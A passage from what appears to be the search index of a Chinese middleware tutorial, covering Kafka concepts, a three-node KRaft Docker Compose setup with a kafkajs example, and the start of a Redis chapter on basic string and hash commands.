setTimeout(resolve, 30000)); await Promise.all([producer.disconnect(), consumer.disconnect()]); } main().catch(console.error);","title":"kafka \u9ad8\u6027\u80fd\u6d88\u606f\u961f\u5217"},{"location":"27/#ch27-kafka","text":"\u8fd9\u91cc\u5b66\u4e60\u7684 Kafka \u4e0e\u4e4b\u524d\u5b66\u4e60\u7684 RabbitMQ \u7684\u533a\u522b\u662f\uff0cKafka \u5176\u5b9e\u66f4\u6ce8\u91cd\u7684\u662f\u6d41\u5f0f\u6570\u636e\uff0c\u9ad8\u541e\u5410\u7684\u6027\u80fd\u5904\u7406\uff0c\u800c RabbitMQ \u6027\u80fd\u6bd4 Kafka \u5dee\uff0c\u4f46\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u7279\u6027\u3002Kafka \u9002\u7528\u4e8e\u65e5\u5fd7\u6536\u96c6\u4e0e\u5904\u7406\u7b49\u573a\u666f\uff0c\u4e00\u822c\u53ea\u6709\u6570\u636e\u91cf\u8db3\u591f\u5927\u624d\u9700\u8981\u7528\u5230\u5b83\u3002 \u6ce8\u610f\uff0cKafka \u662f\u4e00\u79cd\u6301\u4e45\u5316\u7684\u8ba2\u9605-\u53d1\u5e03\u6a21\u5f0f\uff0c\u53ef\u4ee5\u7528\u4e8e\u5b58\u50a8\u6570\u636e\uff0c\u4e14\u5728\u6d88\u606f\u8f6c\u53d1\u540e\u4e0d\u4f1a\u4e22\u5f03\u3002","title":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch27 Kafka \u9ad8\u6027\u80fd\u6d88\u606f\u961f\u5217"},{"location":"27/#_1","text":"Broker\uff08\u4ee3\u7406\u8282\u70b9\uff09 \u8fd9\u662f Kafka \u96c6\u7fa4\u4e2d\u7684\u670d\u52a1\u5668\u8282\u70b9 \u6bcf\u4e2a broker \u8d1f\u8d23\u5b58\u50a8\u6570\u636e\u5e76\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42 \u591a\u4e2a broker \u7ec4\u6210\u4e00\u4e2a Kafka \u96c6\u7fa4 Controller\uff08\u63a7\u5236\u5668\uff09 \u662f\u4e00\u4e2a\u7279\u6b8a\u7684 broker\uff0c\u7531\u96c6\u7fa4\u9009\u4e3e\u4ea7\u751f \u8d1f\u8d23\u7ba1\u7406\u96c6\u7fa4\u72b6\u6001\uff0c\u5982\u5206\u533a\u5206\u914d\u3001leader \u9009\u4e3e\u7b49 \u4e00\u4e2a\u96c6\u7fa4\u53ea\u6709\u4e00\u4e2a controller Topic\uff08\u4e3b\u9898\uff09 \u662f\u6d88\u606f\u7684\u903b\u8f91\u5206\u7c7b \u76f8\u5f53\u4e8e\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u6216\u9891\u9053 \u6bd4\u5982\u53ef\u4ee5\u6709\"\u8ba2\u5355\"\u3001\"\u652f\u4ed8\"\u7b49\u4e0d\u540c\u7684 topic Partition\uff08\u5206\u533a\uff09 \u6bcf\u4e2a topic \u53ef\u4ee5\u5206\u6210\u591a\u4e2a partition partition \u662f\u6570\u636e\u5b58\u50a8\u548c\u590d\u5236\u7684\u57fa\u672c\u5355\u4f4d \u4e0d\u540c partition \u53ef\u4ee5\u5206\u5e03\u5728\u4e0d\u540c broker \u4e0a\uff0c\u5b9e\u73b0\u8d1f\u8f7d\u5747\u8861 Message/Record\uff08\u6d88\u606f/\u8bb0\u5f55\uff09 \u8fd9\u662f Kafka \u4e2d\u6700\u57fa\u672c\u7684\u6570\u636e\u5355\u5143 \u5305\u542b key\u3001value\u3001timestamp \u7b49\u4fe1\u606f \u53d1\u9001\u5230 topic \u4e2d\u7684\u6bcf\u6761\u6570\u636e\u5c31\u662f\u4e00\u6761 message \u5b83\u4eec\u4e4b\u95f4\u7684\u5173\u7cfb\u662f\uff1a Kafka\u96c6\u7fa4 \u251c\u2500\u2500 \u591a\u4e2a Broker (\u5176\u4e2d\u4e00\u4e2a\u662f Controller) \u2514\u2500\u2500 \u591a\u4e2a Topic \u2514\u2500\u2500 \u591a\u4e2a Partition \u2514\u2500\u2500 \u591a\u6761 Message \u5047\u8bbe\u6709\u4e00\u4e2a\u7535\u5546\u7cfb\u7edf\uff0c\u53ef\u80fd\u4f1a\u6709\uff1a \"\u8ba2\u5355\" topic\uff1a\u5b58\u50a8\u8ba2\u5355\u76f8\u5173\u6d88\u606f \"\u652f\u4ed8\" topic\uff1a\u5b58\u50a8\u652f\u4ed8\u76f8\u5173\u6d88\u606f \u6bcf\u4e2a topic \u53ef\u80fd\u5206\u6210 3 \u4e2a partition\uff0c\u5206\u5e03\u5728\u4e0d\u540c broker \u4e0a\uff0c\u63d0\u9ad8\u5e76\u884c\u5904\u7406\u80fd\u529b\u3002 \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b kafka \u7684\u67b6\u6784\u3002 \u57fa\u672c\u67b6\u6784 \u751f\u4ea7\u8005 -> Kafka\u96c6\u7fa4 -> \u6d88\u8d39\u8005 \u2193 ZooKeeper/KRaft \u6838\u5fc3\u7ec4\u4ef6\u548c\u804c\u8d23\uff1a Producer\uff08\u751f\u4ea7\u8005\uff09 \u8d1f\u8d23\u53d1\u9001\u6d88\u606f\u5230 Kafka \u96c6\u7fa4 \u53ef\u4ee5\u6307\u5b9a\u5206\u533a\u7b56\u7565\uff08\u8f6e\u8be2\u3001hash\u7b49\uff09 \u652f\u6301\u540c\u6b65\u6216\u5f02\u6b65\u53d1\u9001 Consumer\uff08\u6d88\u8d39\u8005\uff09 \u4ece Kafka \u96c6\u7fa4\u8bfb\u53d6\u6d88\u606f \u53ef\u4ee5\u7ec4\u6210 Consumer Group \u8fdb\u884c\u6d88\u8d39 \u6bcf\u4e2a\u5206\u533a\u53ea\u80fd\u88ab\u540c\u4e00\u7ec4\u5185\u7684\u4e00\u4e2a\u6d88\u8d39\u8005\u6d88\u8d39 Consumer Group\uff08\u6d88\u8d39\u8005\u7ec4\uff09 \u591a\u4e2a\u6d88\u8d39\u8005\u7ec4\u6210\u4e00\u7ec4 \u5b9e\u73b0\u6d88\u606f\u7684\u5e76\u884c\u6d88\u8d39 \u63d0\u4f9b\u6545\u969c\u8f6c\u79fb\u80fd\u529b \u9ad8\u53ef\u7528\u673a\u5236\uff1a \u526f\u672c\u673a\u5236\uff0c\u4f7f\u7528\u4e00\u4e3b\u591a\u5907\u673a\u5236\u3002 \u6bcf\u4e2a\u5206\u533a\u6709\u591a\u4e2a\u526f\u672c\uff08replica\uff09 \u4e00\u4e2a leader \u526f\u672c\u548c\u591a\u4e2a follower \u526f\u672c follower \u4ece leader \u540c\u6b65\u6570\u636e \u5f53 leader \u6545\u969c\u65f6\uff0c\u4ece follower \u4e2d\u9009\u4e3e\u65b0\u7684 leader \u793a\u4f8b\u67b6\u6784\uff1a Producer\u5c42 \u2193 Broker\u96c6\u7fa4 \u251c\u2500\u2500 Broker1 (Controller) \u2502 \u2514\u2500\u2500 Partition1-Leader \u2502 \u2514\u2500\u2500 Partition2-Follower \u251c\u2500\u2500 Broker2 \u2502 \u2514\u2500\u2500 Partition1-Follower \u2502 \u2514\u2500\u2500 Partition2-Leader \u251c\u2500\u2500 Broker3 \u2502 \u2514\u2500\u2500 Partition1-Follower \u2502 \u2514\u2500\u2500 Partition2-Follower \u2193 Consumer Group\u5c42 \u5173\u952e\u7279\u6027\uff1a \u5206\u533a\u63d0\u4f9b\u5e76\u884c\u5904\u7406\u80fd\u529b \u526f\u672c\u63d0\u4f9b\u9ad8\u53ef\u7528\u6027 Consumer Group \u63d0\u4f9b\u6269\u5c55\u6027 Controller \u63d0\u4f9b\u96c6\u4e2d\u5f0f\u7ba1\u7406 \u652f\u6301\u6c34\u5e73\u6269\u5c55 \u8fd9\u79cd\u67b6\u6784\u8bbe\u8ba1\u4f7f Kafka\uff1a \u5177\u6709\u9ad8\u541e\u5410\u91cf \u53ef\u9760\u6027\u5f3a \u5bb9\u9519\u6027\u597d \u6613\u4e8e\u6269\u5c55","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"27/#kafka","text":"\u6ce8\u610f\uff0c\u5728\u4ee5\u524d\u7248\u672c\uff0cKafka \u9700\u8981\u642d\u914d Zookeeper\u3002\u4f46\u662f\u73b0\u5728 Kraft \u662f\u66f4\u63a8\u8350\u7684\u673a\u5236\u3002 \u8fd9\u91cc\u76f4\u63a5\u4f7f\u7528 Docker \u542f\u52a8\u4e00\u4e2a Kafka \u96c6\u7fa4\u3002 docker pull apache/kafka-native:3.9.0 docker run -p 9092:9092 apache/kafka-native:3.9.0 \u4f7f\u7528 native \u7248\u672c\u7684\u955c\u50cf\u6027\u80fd\u66f4\u597d\uff0c\u4e0d\u8fc7\u5728\u6211\u4eec\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u8fd9\u4e0d\u91cd\u8981\u3002 Kafka \u7684\u914d\u7f6e\u6587\u4ef6\u5728 Container \u7684 /opt/kafka/config \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u5728\u542f\u52a8 Container \u65f6\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u914d\u7f6e\u3002 \u4e0a\u9762\u8fd9\u6837\u53ea\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e2a\u96c6\u7fa4\u7684 Docker Compose\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u8bf7\u4f7f\u7528 k8s \u6216 ansible \u642d\u5efa\u96c6\u7fa4\u3002 version: '3.8' networks: kafka-net: driver: bridge services: kafka1: image: confluentinc/cp-kafka:7.6.0 hostname: kafka1 container_name: kafka1 networks: - kafka-net ports: - \"19092:19092\" # External access environment: KAFKA_KRAFT_MODE: \"true\" KAFKA_PROCESS_ROLES: \"controller,broker\" KAFKA_NODE_ID: 1 KAFKA_CONTROLLER_QUORUM_VOTERS: \"1@kafka1:9093,2@kafka2:9093,3@kafka3:9093\" KAFKA_LISTENERS: \"CONTROLLER://0.0.0.0:9093,INTERNAL://0.0.0.0:9092,EXTERNAL://0.0.0.0:19092\" KAFKA_ADVERTISED_LISTENERS: \"INTERNAL://kafka1:9092,EXTERNAL://localhost:19092\" KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: \"CONTROLLER:PLAINTEXT,INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT\" KAFKA_CONTROLLER_LISTENER_NAMES: \"CONTROLLER\" KAFKA_INTER_BROKER_LISTENER_NAME: \"INTERNAL\" CLUSTER_ID: \"m1Ze6AjGRwqarkcxJscgyQ\" KAFKA_LOG_DIRS: \"/var/lib/kafka/data\" volumes: - ./kafka1/data:/var/lib/kafka/data kafka2: image: confluentinc/cp-kafka:7.6.0 hostname: kafka2 container_name: kafka2 networks: - kafka-net ports: - \"19093:19093\" environment: KAFKA_KRAFT_MODE: \"true\" KAFKA_PROCESS_ROLES: \"controller,broker\" KAFKA_NODE_ID: 2 KAFKA_CONTROLLER_QUORUM_VOTERS: \"1@kafka1:9093,2@kafka2:9093,3@kafka3:9093\" KAFKA_LISTENERS: \"CONTROLLER://0.0.0.0:9093,INTERNAL://0.0.0.0:9092,EXTERNAL://0.0.0.0:19093\" KAFKA_ADVERTISED_LISTENERS: \"INTERNAL://kafka2:9092,EXTERNAL://localhost:19093\" KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: \"CONTROLLER:PLAINTEXT,INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT\" KAFKA_CONTROLLER_LISTENER_NAMES: \"CONTROLLER\" KAFKA_INTER_BROKER_LISTENER_NAME: \"INTERNAL\" CLUSTER_ID: \"m1Ze6AjGRwqarkcxJscgyQ\" KAFKA_LOG_DIRS: \"/var/lib/kafka/data\" volumes: - ./kafka2/data:/var/lib/kafka/data kafka3: image: confluentinc/cp-kafka:7.6.0 hostname: kafka3 container_name: kafka3 networks: - kafka-net ports: - \"19094:19094\" environment: KAFKA_KRAFT_MODE: \"true\" KAFKA_PROCESS_ROLES: \"controller,broker\" KAFKA_NODE_ID: 3 KAFKA_CONTROLLER_QUORUM_VOTERS: \"1@kafka1:9093,2@kafka2:9093,3@kafka3:9093\" KAFKA_LISTENERS: \"CONTROLLER://0.0.0.0:9093,INTERNAL://0.0.0.0:9092,EXTERNAL://0.0.0.0:19094\" KAFKA_ADVERTISED_LISTENERS: \"INTERNAL://kafka3:9092,EXTERNAL://localhost:19094\" KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: \"CONTROLLER:PLAINTEXT,INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT\" KAFKA_CONTROLLER_LISTENER_NAMES: \"CONTROLLER\" KAFKA_INTER_BROKER_LISTENER_NAME: \"INTERNAL\" CLUSTER_ID: \"m1Ze6AjGRwqarkcxJscgyQ\" KAFKA_LOG_DIRS: \"/var/lib/kafka/data\" volumes: - ./kafka3/data:/var/lib/kafka/data \u8fd9\u91cc\u7684\u914d\u7f6e\u9700\u8981\u6ce8\u610f\uff0c\u6bd4\u8f83\u590d\u6742\uff0c \u8fd9\u91cc\u7684\u914d\u7f6e\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u51e0\u70b9\uff1a KAFKA_KRAFT_MODE \uff1a\u8bbe\u7f6e\u4e3a true \u8868\u793a\u542f\u7528\u4e86Kafka\u7684KRaft\u6a21\u5f0f\uff0c\u5373\u4e0d\u4f9d\u8d56Zookeeper\u3002\u8fd9\u662fKafka\u7684\u65b0\u7279\u6027\uff0c\u63a8\u8350\u5728\u65b0\u7248\u672c\u4e2d\u4f7f\u7528\u3002 KAFKA_PROCESS_ROLES \uff1a\u6307\u5b9a\u6bcf\u4e2aKafka\u8282\u70b9\u7684\u89d2\u8272\u3002\u5728\u6b64\u914d\u7f6e\u4e2d\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u540c\u65f6\u4f5c\u4e3a\u63a7\u5236\u5668\u548c\u4ee3\u7406\uff08 controller,broker \uff09\u3002\u8fd9\u5141\u8bb8Kafka\u96c6\u7fa4\u5728\u6ca1\u6709\u72ec\u7acb\u63a7\u5236\u5668\u8282\u70b9\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u3002 KAFKA_NODE_ID \uff1a\u4e3a\u6bcf\u4e2a\u8282\u70b9\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684ID\u3002\u8fd9\u91cc\u5206\u522b\u4e3a1\u30012\u548c3\uff0c\u5206\u522b\u4ee3\u8868\u4e09\u4e2aKafka\u8282\u70b9\u3002 KAFKA_CONTROLLER_QUORUM_VOTERS \uff1a\u914d\u7f6e\u96c6\u7fa4\u4e2d\u63a7\u5236\u5668\u7684\u9009\u4e3e\u6210\u5458\uff0c\u8fd9\u91cc\u5305\u62ec\u6240\u6709\u4e09\u4e2a\u8282\u70b9\u3002\u63a7\u5236\u5668\u8d1f\u8d23\u7ba1\u7406Kafka\u96c6\u7fa4\u7684\u5143\u6570\u636e\u548c\u534f\u8c03\u5de5\u4f5c\u3002 KAFKA_LISTENERS \u548c KAFKA_ADVERTISED_LISTENERS \uff1a\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u7528\u4e8e\u6307\u5b9aKafka\u8282\u70b9\u7684\u76d1\u542c\u5730\u5740\u548c\u5e7f\u544a\u5730\u5740\u3002 INTERNAL \u7528\u4e8e\u96c6\u7fa4\u5185\u90e8\u901a\u4fe1\uff0c EXTERNAL \u5219\u7528\u4e8e\u5916\u90e8\u8bbf\u95ee\u3002 KAFKA_LOG_DIRS \uff1a\u6307\u5b9aKafka\u6570\u636e\u5b58\u50a8\u7684\u8def\u5f84\u3002\u6bcf\u4e2a\u8282\u70b9\u90fd\u9700\u8981\u4e00\u4e2a\u5355\u72ec\u7684\u5377\u6765\u5b58\u50a8\u5176\u65e5\u5fd7\u6570\u636e\u3002 KAFKA_LISTENER_SECURITY_PROTOCOL_MAP \uff1a\u8fd9\u662f\u7528\u6765\u6307\u5b9a\u4e0d\u540c\u76d1\u542c\u5668\u534f\u8bae\u7684\u6620\u5c04\u3002\u5728\u8fd9\u4e2a\u914d\u7f6e\u4e2d\uff0c CONTROLLER \u3001 INTERNAL \u3001 EXTERNAL \u4e09\u4e2a\u534f\u8bae\u90fd\u8bbe\u7f6e\u4e3a PLAINTEXT \u3002\u8fd9\u610f\u5473\u7740\u901a\u4fe1\u4e0d\u52a0\u5bc6\u3002\u5982\u679c\u9700\u8981\u66f4\u5b89\u5168\u7684\u901a\u4fe1\uff0c\u53ef\u4ee5\u9009\u62e9 SSL \u6216 SASL \u7b49\u534f\u8bae\u3002 KAFKA_CONTROLLER_LISTENER_NAMES \uff1a\u7528\u4e8e\u6307\u5b9a\u63a7\u5236\u5668\u76d1\u542c\u5668\u7684\u540d\u79f0\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u63a7\u5236\u5668\u76d1\u542c\u5668\u7684\u540d\u79f0\u662f CONTROLLER \uff0c\u5b83\u4f1a\u4e0e KAFKA_LISTENERS \u4e2d\u7684 CONTROLLER \u534f\u8bae\u914d\u5bf9\u3002 KAFKA_INTER_BROKER_LISTENER_NAME \uff1a\u6307\u5b9a\u96c6\u7fa4\u4e2d\u8282\u70b9\u4e4b\u95f4\uff08\u5373\u4ee3\u7406\u4e4b\u95f4\uff09\u901a\u4fe1\u4f7f\u7528\u7684\u76d1\u542c\u5668\u540d\u79f0\u3002\u8fd9\u91cc\u8bbe\u7f6e\u4e3a INTERNAL \uff0c\u610f\u5473\u7740\u5185\u90e8\u7684\u8282\u70b9\u95f4\u901a\u4fe1\u4f1a\u4f7f\u7528 INTERNAL \u534f\u8bae\u3002 CLUSTER_ID \uff1a\u8fd9\u662f\u96c6\u7fa4\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5728\u542f\u7528KRaft\u6a21\u5f0f\u65f6\uff0cKafka\u9700\u8981\u4e00\u4e2a CLUSTER_ID \u6765\u533a\u5206\u4e0d\u540c\u7684\u96c6\u7fa4\u3002\u786e\u4fdd\u5728\u6240\u6709\u8282\u70b9\u4e0a\u4f7f\u7528\u76f8\u540c\u7684 CLUSTER_ID \u3002\u8fd9\u91cc\u5fc5\u987b\u662f\u4e00\u4e2a base64 UUID\uff0c\u968f\u673a\u751f\u6210\u4e00\u4e2a\u5373\u53ef\u3002 KAFKA_LOG_DIRS \uff1a\u6307\u5b9aKafka\u65e5\u5fd7\u7684\u5b58\u50a8\u4f4d\u7f6e\u3002\u6bcf\u4e2aKafka\u5bb9\u5668\u90fd\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u4ee5\u907f\u514d\u6570\u636e\u4e22\u5931\u3002\u901a\u5e38\u4f1a\u5c06\u5bb9\u5668\u7684\u5b58\u50a8\u76ee\u5f55\u6620\u5c04\u5230\u672c\u5730\u7684\u67d0\u4e2a\u8def\u5f84\uff0c\u6bd4\u5982 ./kafka1/data \u3001 ./kafka2/data \u7b49\u3002","title":"\u542f\u52a8 Kafka"},{"location":"27/#kafka_1","text":"\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 NodeJS \u64cd\u7eb5 Kafka \u96c6\u7fa4\u3002\u5f53\u7136\uff0c\u5355\u673a NodeJS \u5904\u7406\u53ef\u80fd\u6027\u80fd\u4e0d\u591f\uff0c\u4f46\u662f\u5728\u5fae\u670d\u52a1\u573a\u666f\u4e0b\uff0c\u56e0\u4e3a\u670d\u52a1\u53ef\u4ee5\u81ea\u7531\u4f38\u7f29\uff0c\u56e0\u6b64\u5355\u673a\u7684\u6027\u80fd\u53cd\u800c\u4e0d\u662f\u5f88\u91cd\u8981\u4e86\u3002 const { Kafka } = require('kafkajs'); // \u57fa\u7840\u914d\u7f6e const kafka = new Kafka({ clientId: 'simple-client', brokers: ['localhost:19092', 'localhost:19093', 'localhost:19094'], connectionTimeout: 10000, retry: { retries: 10 } }); async function main() { // \u751f\u4ea7\u8005 const producer = kafka.producer(); await producer.connect(); await producer.send({ topic: 'simple-topic', messages: [{ value: 'Test Message' }], acks: -1 }); console.log('\u6d88\u606f\u53d1\u9001\u6210\u529f'); // \u6d88\u8d39\u8005\uff08\u89e3\u51b3\u534f\u8c03\u5668\u95ee\u9898\u5173\u952e\u914d\u7f6e\uff09 const consumer = kafka.consumer({ groupId: 'simple-group', sessionTimeout: 30000, retry: { retries: 15 } }); await consumer.connect(); await consumer.subscribe({ topic: 'simple-topic', fromBeginning: true }); consumer.run({ eachMessage: async ({ message }) => { console.log(`\u6536\u5230\u6d88\u606f: ${message.value}`); } }); // \u4fdd\u6301\u8fd0\u884c30\u79d2 await new Promise(resolve => setTimeout(resolve, 30000)); await Promise.all([producer.disconnect(), consumer.disconnect()]); } main().catch(console.error);","title":"\u64cd\u7eb5 Kafka"},{"location":"28/","text":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch28 Redis Redis \u5373 Remote Dictionary Service\uff0c\u8fdc\u7a0b\u5b57\u5178\u670d\u52a1\u3002\u5b83\u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u952e\u503c\uff08Key-Value\uff09\u5b58\u50a8\u6570\u636e\u5e93\uff0c\u5e7f\u6cdb\u5e94\u7528\u4e8e\u7f13\u5b58\u3001\u6d88\u606f\u961f\u5217\u3001\u5b9e\u65f6\u7edf\u8ba1\u7b49\u573a\u666f\u3002\u4e0e\u4f20\u7edf\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e0d\u540c\uff0cRedis \u5728\u5185\u5b58\u4e2d\u8fdb\u884c\u6570\u636e\u5b58\u50a8\uff0c\u63d0\u4f9b\u4e86\u6781\u9ad8\u7684\u8bfb\u5199\u6027\u80fd\uff0c\u540c\u65f6\u4e5f\u652f\u6301\u591a\u79cd\u590d\u6742\u7684\u6570\u636e\u7ed3\u6784\u548c\u64cd\u4f5c\u3002 \u5c3d\u7ba1 Redis \u8fd1\u671f\u4fee\u6539\u4e86\u5f00\u6e90\u534f\u8bae\uff0c\u4f46\u4e0d\u53ef\u5426\u8ba4\u5b83\u5df2\u7ecf\u662f\u540c\u7c7b\u4e2d\u95f4\u4ef6\u7684\u6807\u51c6\u3002\u5982\u679c\u5bf9\u5f00\u6e90\u6709\u5f3a\u9700\u6c42\uff0c\u53ef\u4ee5\u8003\u8651\u76f8\u4e92\u517c\u5bb9\u7684\u5176\u5b83\u4e2d\u95f4\u4ef6\uff0c\u5982 KeyDB\u3002 \u6211\u4eec\u9700\u8981\u7528 SQL \u64cd\u7eb5\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u540c\u6837\u7684\uff0cRedis \u4e5f\u6709\u4e13\u95e8\u7684\u547d\u4ee4\u6765\u64cd\u7eb5\u3002\u5f53\u7136\uff0c\u4e5f\u6709 ORM \u8fdb\u884c\u8fdb\u4e00\u6b65\u5305\u88c5\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u4ecb\u7ecd Redis \u7684\u5e38\u7528\u6570\u636e\u7ed3\u6784\u4e0e\u547d\u4ee4\uff0c\u4f5c\u4e3a\u7f13\u5b58\u548c\u5206\u5e03\u5f0f\u9501\u7684\u7528\u6cd5\u3002 Redis \u53ef\u4ee5\u76f4\u63a5\u90e8\u7f72\u4e3a\u96c6\u7fa4\uff0c\u96c6\u7fa4\u7684\u64cd\u4f5c\u4e0e\u5355\u4f53\u4e00\u81f4\u3002 \u542f\u52a8 Redis version: '3.8' services: redis: image: redis:latest container_name: redis_container ports: - \"6379:6379\" volumes: - ./data:/data \u542f\u52a8\u540e\uff0c\u4f7f\u7528 redis-cli \u8fde\u63a5\u5230 Redis \u5bb9\u5668\uff1a docker exec -it redis_container redis-cli \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u6253\u5f00\u4e00\u4e2a redis-cli \u4f1a\u8bdd\uff0c\u4f60\u53ef\u4ee5\u5728\u5176\u4e2d\u6267\u884c Redis \u547d\u4ee4\u3002\u5982\u679c\u4f60\u53ea\u662f\u9700\u8981\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u786e\u4fdd Redis \u6b63\u5e38\u5de5\u4f5c\uff1a SET key \"Hello Redis\" GET key \u8fd9\u4f1a\u5c06\u952e key \u8bbe\u7f6e\u4e3a \"Hello Redis\"\uff0c\u7136\u540e\u901a\u8fc7 GET \u547d\u4ee4\u8fd4\u56de\u8be5\u952e\u7684\u503c\uff0c\u8f93\u51fa\u5e94\u8be5\u662f\uff1a \"Hello Redis\" \u8981\u9000\u51fa redis-cli\uff0c\u4f7f\u7528 exit Redis \u5e38\u7528\u6570\u636e\u7ed3\u6784\u4e0e\u547d\u4ee4 \u5b57\u7b26\u4e32\uff08String\uff09 Redis \u4e2d\u6700\u57fa\u672c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5b83\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u7c7b\u578b\u7684\u6570\u636e\uff0c\u4f8b\u5982\u6574\u6570\u3001\u6d6e\u70b9\u6570\u3001\u4e8c\u8fdb\u5236\u6570\u636e\u7b49\u3002\u6ce8\u610f\uff0cRedis \u4e2d\u6ca1\u6709\u6570\u503c\u7c7b\u578b\uff0c\u6240\u6709\u6570\u503c\u90fd\u6309\u5b57\u7b26\u4e32\u5b58\u50a8\u3002 SET\uff1a\u8bbe\u7f6e\u952e\u7684\u503c\u3002 GET\uff1a\u83b7\u53d6\u952e\u7684\u503c\u3002 DEL\uff1a\u5220\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u952e\u3002 INCR/DECR\uff1a\u81ea\u589e/\u81ea\u51cf\u4e00\u4e2a\u6574\u6570\u503c\u3002 SET username \"john_doe\" # \u8bbe\u7f6e\u952e\u503c GET username # \u83b7\u53d6\u952e\u503c INCR counter # \u589e\u52a0counter\u7684\u503c \u8fd8\u53ef\u4ee5\u6279\u91cf\u8bbe\u7f6e\uff0c MSET \u547d\u4ee4\u5141\u8bb8\u4e00\u6b21\u8bbe\u7f6e\u591a\u4e2a\u952e\u503c\u5bf9\u3002\u5b83\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a MSET key1 value1 key2 value2 key3 value3 \u4f8b\u5982\uff0c\u6279\u91cf\u8bbe\u7f6e\u4e09\u4e2a\u952e\u503c\u5bf9\uff1a MSET username \"john_doe\" email \"john@example.com\" age 30 MGET \u547d\u4ee4\u5141\u8bb8\u4e00\u6b21\u83b7\u53d6\u591a\u4e2a\u952e\u7684\u503c\u3002\u5b83\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a MGET key1 key2 key3 \u4f8b\u5982\uff0c\u6279\u91cf\u83b7\u53d6\u4e4b\u524d\u8bbe\u7f6e\u7684\u4e09\u4e2a\u952e\u503c\uff1a MGET username email age \u5982\u679c\u67d0\u4e2a\u952e\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de nil\uff08\u7a7a\u503c\uff09\uff0c\u4f8b\u5982\uff1a MGET username email non_existing_key # \u8fd4\u56de (john_doe, john@example.com, nil) DEL \u4e5f\u652f\u6301\u5220\u9664\u591a\u4e2a\u952e\u3002\u5176\u8bed\u6cd5\u5982\u4e0b\uff1a DEL key1 key2 key3 \u54c8\u5e0c\uff08Hash\uff09 Redis \u7684\u54c8\u5e0c\u662f\u4e00\u4e2a\u952e\u503c\u5bf9\u96c6\u5408\uff0c\u5b83\u7279\u522b\u9002\u5408\u5b58\u50a8\u5bf9\u8c61\u7c7b\u578b\u7684\u6570\u636e\u3002\u6bcf\u4e2a\u54c8\u5e0c\u8868\u6709\u4e00\u4e2a\u952e\u548c\u591a\u4e2a\u5b57\u6bb5\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u6709\u4e00\u4e2a\u503c\u3002 HSET\uff1a\u8bbe\u7f6e\u54c8\u5e0c\u8868\u5b57\u6bb5\u7684\u503c\u3002 HGET\uff1a\u83b7\u53d6\u54c8\u5e0c\u8868\u5b57\u6bb5\u7684\u503c\u3002 HGETALL\uff1a\u83b7\u53d6\u54c8\u5e0c\u8868\u6240\u6709\u5b57\u6bb5\u548c\u503c\u3002 HDEL\uff1a\u5220\u9664\u54c8\u5e0c\u8868\u4e2d\u7684\u5b57\u6bb5\u3002 HSET user:1000 name \"Alice\" age 25 HGET user:1000 name HGETALL user:1000 HDEL user:1000 age \u6ce8\u610f\uff0chash \u7c7b\u578b\u7684\u503c\u4e0d\u80fd\u662f hash \u7c7b\u578b\u3002\u5373\u4e0d\u80fd\u5d4c\u5957 hash\u3002\u4f46\u5176\u5b83\u6570\u636e\u7c7b\u578b\u662f\u53ef\u4ee5\u7684\u3002 \u8fd9\u91cc\u7528 user:1000 \u662f\u4f5c\u4e3a hash \u8868\u7684\u540d\u79f0\u3002\u56e0\u4e3a\u4e0d\u652f\u6301\u5d4c\u5957 hash\uff0c\u4e00\u79cd\u5e38\u89c1\u7684 trick \u662f\u4f7f\u7528\u5192\u53f7\u5206\u5272\u7d22\u5f15\u3002\u4f8b\u5982\u8fd9\u91cc user:1000 \u53ef\u4ee5\u8ba4\u4e3a\u662f ID \u4e3a 1000 \u7684\u7528\u6237\u3002\u6ce8\u610f\uff0c\u8fd9\u4e0d\u662f\u6807\u51c6\uff0c\u5177\u4f53\u4f7f\u7528\u54ea\u4e2a\u5b57\u7b26\u5206\u5272\u8bf7\u53c2\u7167\u5f00\u53d1\u89c4\u8303\u3002 \u5217\u8868\uff08List\uff09 Redis 